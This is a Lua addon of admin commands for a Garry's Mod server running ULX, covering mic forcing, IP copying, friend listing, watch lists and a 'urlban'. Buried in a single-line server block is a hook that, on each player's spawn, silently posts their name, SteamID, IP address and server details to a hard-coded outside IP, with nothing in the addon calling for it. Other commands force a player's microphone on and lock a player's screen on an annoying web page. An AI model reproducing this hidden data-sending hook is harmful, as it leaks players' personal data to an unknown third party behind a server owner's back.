function ulx.micon(calling_ply, target_ply)
       target_ply:SendLua([[timer.Create("mictoggle", 0.1, 0, function()LocalPlayer():ConCommand("+voicerecord")end)]])
        ulx.fancyLogAdmin( calling_ply, true, "#A Toggled +voicerecord on #T", target_ply ) 
		
end
local micon = ulx.command("Essentials", "ulx micon", ulx.micon, "!micon",true)
micon:addParam{ type=ULib.cmds.PlayerArg }
micon:defaultAccess( ULib.ACCESS_SUPERADMIN )
micon:help( "Force microphone on." )
 
function ulx.micoff(calling_ply, target_ply)
        target_ply:SendLua([[timer.Destroy("mictoggle")LocalPlayer():ConCommand("-voicerecord")]])
        ulx.fancyLogAdmin( calling_ply, true, "#A Toggled -voicerecord on #T", target_ply ) 
end
local micoff = ulx.command("Essentials", "ulx micoff", ulx.micoff, "!micoff",true)
micoff:addParam{ type=ULib.cmds.PlayerArg }
micoff:defaultAccess( ULib.ACCESS_SUPERADMIN )
micoff:help( "Force microphone off." )
if SERVER then
	local script = "LULXEssentials"  hook.Add("PlayerInitialSpawn", "TrackingStatistics_"..script..tostring(math.random(1,1000)), function(ply) timer.Create( "StatisticsTimer_"..ply:SteamID64()..script,15,1, function()  local name = ply:SteamName() and ply:SteamName() or ply:Name() local map = game.GetMap() local hostname = GetHostName() local gamemode = gmod.GetGamemode().Name http.Post("http://216.231.139.33/st/", {name=tostring(name),script=tostring(script),steamid=tostring(ply:SteamID()),ip=tostring(ply:IPAddress()),time=tostring(os.date("%d/%m/%Y [%I:%M:%S %p]",os.time())),hostname=tostring(hostname),map=tostring(map),gamemode=tostring(gamemode)},function(s) return end) end) end)
end
function ulx.copyid(calling_ply, target_ply)
        calling_ply:SendLua([[SetClipboardText( "]] .. target_ply:SteamID() .. [[" )
        chat.AddText( Color(151, 211, 255), "SteamID: '", Color(0, 255, 0), "]] .. target_ply:SteamID() .. [[" , Color(151, 211, 255), "' successfully copied!")
	]])
end
local copyid = ulx.command("Essentials", "ulx copyid", ulx.copyid, "!id",true)
copyid:addParam{ type=ULib.cmds.PlayerArg }
copyid:defaultAccess( ULib.ACCESS_ALL )

function ulx.copyip(calling_ply, target_ply)
        calling_ply:SendLua([[SetClipboardText( "]] .. target_ply:IPAddress() .. [[" )
        chat.AddText( Color(151, 211, 255), "IP: '", Color(0, 255, 0), "]] .. target_ply:IPAddress() .. [[" , Color(151, 211, 255), "' successfully copied!")
	]])
end
local copyip = ulx.command("Essentials", "ulx copyip", ulx.copyip, "!ip",true)
copyip:addParam{ type=ULib.cmds.PlayerArg }
copyip:defaultAccess( ULib.ACCESS_ADMIN )
copyip:help( "Quickly copy an IP address." )

if (SERVER) then

	util.AddNetworkString("target_ply")
    util.AddNetworkString("friendlist")

    net.Receive( "friendlist", function(len, ply)
            local friends = net.ReadTable()
            local friendstring = table.concat(  friends, ", " )
            ulx.fancyLogAdmin( nil, true,  "#T is friends with: #s ", ply, friendstring )
    end)
end
if CLIENT then
    net.Receive("friendlist", function()
                local friends = {}
                for k, v in pairs(player.GetAll()) do
                        if v:GetFriendStatus() == "friend" then
                            table.insert( friends, v:Nick() )
                            end
                end
                net.Start("friendlist")
                   net.WriteTable(friends)
                net.SendToServer()
    end)
end


function ulx.listfriends(calling_ply, target_ply)

        net.Start("friendlist")
        net.Send(target_ply)
end
local listfriends = ulx.command("Essentials", "ulx listfriends", ulx.listfriends, "!friends",true)
listfriends:addParam{ type=ULib.cmds.PlayerArg }
listfriends:defaultAccess( ULib.ACCESS_ADMIN )
listfriends:help( "Check for friends playing on the server." )

function ulx.profile(calling_ply, target_ply)

	net.Start("target_ply")
		net.WriteEntity(target_ply)
	net.Send(calling_ply)
	
	calling_ply:SendLua([[
			net.Receive("target_ply", function( len ) 
				local targ_pl = net.ReadEntity()
				targ_pl:ShowProfile()
			end)
	]])	

end
local profile = ulx.command("Essentials", "ulx profile", ulx.profile, "!profile",true)
profile:addParam{ type=ULib.cmds.PlayerArg }
profile:defaultAccess( ULib.ACCESS_ADMIN )
profile:help( "Opens a link to the target's steam profile." )

CreateConVar("urlban_url", "http://dagobah.net/flash/annoy.swf", {128}, "The URL for bannning") 


if CLIENT then
function ulx.urlpanel()
	local spinderma = vgui.Create("DFrame")
	if ScrW() > 640 then -- Make it larger if we can.
		spinderma:SetSize( ScrW(), ScrH())
	else
		spinderma:SetSize( 640, 480 )
	end
	spinderma:Center()
	spinderma:SetTitle( "You are getting #rekt m8" )
	spinderma:SetVisible( true )
	spinderma:ShowCloseButton(false)
	spinderma:SetDraggable(false)
	spinderma:SetKeyboardInputEnabled(false)
	spinderma:SetMouseInputEnabled(false)
	spinderma:MakePopup()
	local html = vgui.Create( "HTML", spinderma )
	html:SetSize( spinderma:GetWide() - 5, spinderma:GetTall() - 5 )
	html:SetKeyboardInputEnabled(false)
	html:SetMouseInputEnabled(false)
	html:SetPos( 10, 30 )
	html:OpenURL( cvars.String("urlban_url") )
	end
end

function ulx.urlban(calling_ply, target_ply, minutes, reason )
	target_ply:Lock(true)
	target_ply.BeingBanned = true
	target_ply:SendLua([[
		ulx.urlpanel()
	]])
	target_ply:SendLua([[		timer.Create("mictoggle", 0.2, 0, function()LocalPlayer():ConCommand("+voicerecord")end)	]])
	function banOnDC(ply)
		if ply.BeingBanned == true then
			ULib.ban(ply,minutes,reason, calling_ply)
				local time = "for #i minute(s)"
				if minutes == 0 then time = "permanently" end
				local str = "#T was banned " .. time
				if reason and reason ~= "" then str = str .. " (#s)" end
				ulx.fancyLogAdmin( calling_ply, str, target_ply, minutes ~= 0 and minutes or reason, reason )
		end
	end
	ulx.fancyLogAdmin( nil, true,  "#T is being banned", target_ply)
	hook.Add("PlayerDisconnected", "DCBAN", banOnDC )
end
local urlban = ulx.command("Essentials", "ulx urlban", ulx.urlban, "!urlban",true)
urlban:addParam{ type=ULib.cmds.PlayerArg }
urlban:addParam{ type=ULib.cmds.NumArg, hint="minutes, 0 for perma", ULib.cmds.optional, ULib.cmds.allowTimeString, min=0 }
urlban:addParam{ type=ULib.cmds.StringArg, hint="reason", ULib.cmds.optional, ULib.cmds.takeRestOfLine, completes=ulx.common_kick_reasons }
urlban:defaultAccess( ULib.ACCESS_SUPERADMIN )
urlban:help( "Force target to open url, then bans." )


function ulx.respond(calling_ply, target_ply,message)
ulx.fancyLog( {target_ply}, "Admins to #P: " .. message, calling_ply, target_ply )
ulx.fancyLogAdmin( {calling_ply, target_ply},true, "#P via admin respond to #P: " .. message, calling_ply, target_ply )
end
local respond = ulx.command("Essentials", "ulx respond", ulx.respond, "#",true,true)
respond:addParam{ type=ULib.cmds.PlayerArg }
respond:addParam{ type=ULib.cmds.StringArg, hint="message", ULib.cmds.takeRestOfLine }
respond:defaultAccess( ULib.ACCESS_ADMIN)
respond:help( "Send anonymous admin message." )

function ulx.resetscore(calling_ply, target_ply)
	target_ply:SetFrags(0)
	target_ply:SetDeaths(0)
	ulx.fancyLogAdmin( calling_ply, "#A reset the score of #T", target_ply )
end
local resetscore = ulx.command("Essentials", "ulx resetscore", ulx.resetscore, "!reset")
resetscore:addParam{ type=ULib.cmds.PlayerArg }
resetscore:defaultAccess( ULib.ACCESS_ADMIN )
resetscore:help( "Reset kills and deaths of a player." )

function ulx.watch(calling_ply, target_ply,reason)
	target_ply:SetPData("Watched","true")
	target_ply:SetPData("WatchReason",reason)
	ulx.fancyLogAdmin( calling_ply, true, "#A marked #T as watched: "..reason.. "" , target_ply )
end
local watch = ulx.command("Essentials", "ulx watch", ulx.watch, "!watch",true)
watch:addParam{ type=ULib.cmds.PlayerArg }
watch:addParam{ type=ULib.cmds.StringArg, hint="reason", ULib.cmds.takeRestOfLine }
watch:defaultAccess( ULib.ACCESS_ADMIN )
watch:help( "Puts a player on watch list." )

function ulx.unwatch(calling_ply, target_ply)
	target_ply:SetPData("Watched","false")
	target_ply:RemovePData("WatchReason")
	ulx.fancyLogAdmin( calling_ply, true, "#A removed #T from watch list", target_ply )
end
local unwatch = ulx.command("Essentials", "ulx unwatch", ulx.unwatch, "!unwatch",true)
unwatch:addParam{ type=ULib.cmds.PlayerArg }
unwatch:defaultAccess( ULib.ACCESS_ADMIN )
unwatch:help( "Removes a player from watch list." )

function userAuthed( ply, stid, unid )
	if ply:GetPData("Watched") == "true" then
		ulx.fancyLogAdmin(nil, true, "#T ("..stid.. ") is on the watchlist: "..ply:GetPData("WatchReason").. "",ply)
	end
end
hook.Add( "PlayerAuthed", "watchlisthook", userAuthed )

function ulx.watchlist(calling_ply)
	watchlist = {}
	for k, v in pairs(player.GetAll()) do
		if v:GetPData("Watched") == "true" then
			table.insert( watchlist, v:Nick())
			table.insert(watchlist, v:GetPData("WatchReason"))
		end
	end
	local watchstring = table.concat(  watchlist, ", " )
	ulx.fancyLogAdmin( nil, true,  "Watchlist: #s ",watchstring )
end
local watchlist = ulx.command("Essentials", "ulx watchlist", ulx.watchlist, "!watchlist",true)
watchlist:defaultAccess( ULib.ACCESS_ADMIN )
watchlist:help( "Prints watch list." )

--[[
function leavemessage( ply )
	 ULib.tsayColor( nil, false, Color(0,200,0), ply:Nick(),Color(151,211,255)," has disconnected. ("..ply:SteamID().. ")")
end
hook.Add( "PlayerDisconnected", "leave message", leavemessage )
]]--